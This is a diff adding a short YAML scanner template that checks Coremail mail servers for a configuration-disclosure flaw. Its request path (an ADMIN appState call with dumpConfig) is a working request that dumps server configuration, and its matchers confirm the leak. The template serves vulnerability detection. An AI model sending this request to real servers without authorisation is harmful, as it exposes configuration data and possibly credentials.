@@ -1,0 +1,25 @@
+id: coremail-config-disclosure
+name: Coremail - Config Discovery
+severity: high
+confidence: tentative
+description: Coremail configuration information was discovered.
+reference: https://www.secpulse.com/archives/107611.html
+tags:
+- config
+- exposure
+- coremail
+- vuln
+requests:
+- method: GET
+  path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+  matchers:
+  - type: body
+    words:
+    - <object name="cm_md_db">
+    - containerDefinitions
+    - <string name="User">coremail</string>
+    - <string name="EnableCoremailSmtp">
+  - type: status
+    status:
+    - 200
+  condition: and
